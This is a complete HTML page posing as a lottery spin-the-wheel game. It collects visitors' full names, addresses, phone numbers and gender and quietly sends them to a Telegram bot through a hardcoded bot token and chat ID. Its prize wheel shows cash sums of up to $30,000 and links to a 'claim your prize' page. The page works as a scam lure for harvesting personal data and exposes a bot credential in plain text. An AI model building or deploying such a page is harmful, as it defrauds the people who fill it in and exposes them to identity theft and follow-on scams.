<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Lottery Game</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            text-align: center;
            margin: 0;
            padding: 0;
        }
        h1 {
            color: green;
        }
        .container {
            margin: 20px auto;
            max-width: 500px;
            padding: 20px;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
        }
        input, select, button {
            display: block;
            width: 90%;
            margin: 10px auto;
            padding: 10px;
            font-size: 16px;
        }
        button {
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }
        #wheelCanvas {
            margin-top: 20px;
            cursor: pointer;
        }
        .result {
            margin-top: 20px;
            font-size: 20px;
            font-weight: bold;
            color: green;
        }
    </style>
</head>
<body>

<div class="container" id="formContainer">
    <h2>Lottery Registration</h2>
    <form id="lotteryForm">
        <input type="text" id="firstName" placeholder="First Name" required>
        <input type="text" id="middleName" placeholder="Middle Name">
        <input type="text" id="lastName" placeholder="Last Name" required>
        <input type="text" id="address" placeholder="Full Address" required>
        <input type="tel" id="phone" placeholder="Phone Number" required>
        <select id="gender" required>
            <option value="" disabled selected>Select Gender</option>
            <option value="Male">Male</option>
            <option value="Female">Female</option>
        </select>
        <button type="submit">Submit</button>
    </form>
</div>

<div class="container" id="gameContainer" style="display: none;">
    <h1>Welcome to the Spinning Board!</h1>
    <p>Tap the spinning board to test your luck!</p>
    <canvas id="wheelCanvas" width="300" height="300"></canvas>
    <div class="result" id="result"></div>
</div>

<script>
const TELEGRAM_BOT_TOKEN = '7636367334:AAE6d7AShLfccWJWMkyffSVrvpkURjfqtPY';
const TELEGRAM_CHAT_ID = '874563737';
const prizes = ["$2000", "$5000", "$1000", "$15000", "$20000", "$30000", "Try Again"];

const formContainer = document.getElementById('formContainer');
const gameContainer = document.getElementById('gameContainer');
const resultElement = document.getElementById('result');

// Handle Form Submission
document.getElementById('lotteryForm').addEventListener('submit', function (e) {
    e.preventDefault();

    const firstName = document.getElementById('firstName').value;
    const middleName = document.getElementById('middleName').value;
    const lastName = document.getElementById('lastName').value;
    const address = document.getElementById('address').value;
    const phone = document.getElementById('phone').value;
    const gender = document.getElementById('gender').value;

    const message = `New Lottery Registration:\nName: ${firstName} ${middleName} ${lastName}\nAddress: ${address}\nPhone: ${phone}\nGender: ${gender}`;

    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message }),
    }).then(() => {
        formContainer.style.display = 'none';
        gameContainer.style.display = 'block';
    });
});

// Spinning Board
const canvas = document.getElementById('wheelCanvas');
const ctx = canvas.getContext('2d');
const segments = prizes.length;
const centerX = canvas.width / 2;
const centerY = canvas.height / 2;
const radius = centerX;

// Draw the spinning wheel
function drawWheel() {
    for (let i = 0; i < segments; i++) {
        const angle = (2 * Math.PI / segments) * i;

        ctx.beginPath();
        ctx.moveTo(centerX, centerY);
        ctx.arc(centerX, centerY, radius, angle, angle + (2 * Math.PI / segments));
        ctx.closePath();
        ctx.fillStyle = i % 2 === 0 ? "#FFDD57" : "#FF6347";
        ctx.fill();

        // Add text
        ctx.save();
        ctx.translate(centerX, centerY);
        ctx.rotate(angle + Math.PI / segments);
        ctx.textAlign = "right";
        ctx.font = "14px Arial";
        ctx.fillStyle = "black";
        ctx.fillText(prizes[i], radius - 10, 5);
        ctx.restore();
    }
}
drawWheel();

let spinning = false;
let finalAngle = 0;

// Handle Spin
canvas.addEventListener('click', function () {
    if (spinning) return;

    spinning = true;
    let spinAngle = Math.random() * 3600 + 720; // Random spin angle
    const spinDuration = 5000;
    const startTime = performance.now();

    function animateSpin(time) {
        const elapsed = time - startTime;
        const progress = Math.min(elapsed / spinDuration, 1);
        const currentAngle = (finalAngle + spinAngle * (1 - Math.pow(1 - progress, 3))) % 360;

        ctx.clearRect(0, 0, canvas.width, canvas.height);
        ctx.save();
        ctx.translate(centerX, centerY);
        ctx.rotate(currentAngle * Math.PI / 180);
        ctx.translate(-centerX, -centerY);
        drawWheel();
        ctx.restore();

        if (progress < 1) {
            requestAnimationFrame(animateSpin);
        } else {
            spinning = false;
            finalAngle = currentAngle;
            displayResult(currentAngle);
        }
    }

    requestAnimationFrame(animateSpin);
});

// Determine prize
function displayResult(angle) {
    const segmentAngle = 360 / segments;
    const index = Math.floor(((360 - angle % 360) % 360) / segmentAngle);
    const prize = prizes[index];

    if (prize === "Try Again") {
        resultElement.innerText = "Try Again! Better luck next time.";
    } else {
        resultElement.innerHTML = `
            🎉 Congratulations! You won ${prize}!
            <br><a href="winner.html?prize=${prize}" target="_blank">
                Click here to claim your prize!
            </a>
        `;
    }
}
</script>

</body>
</html>
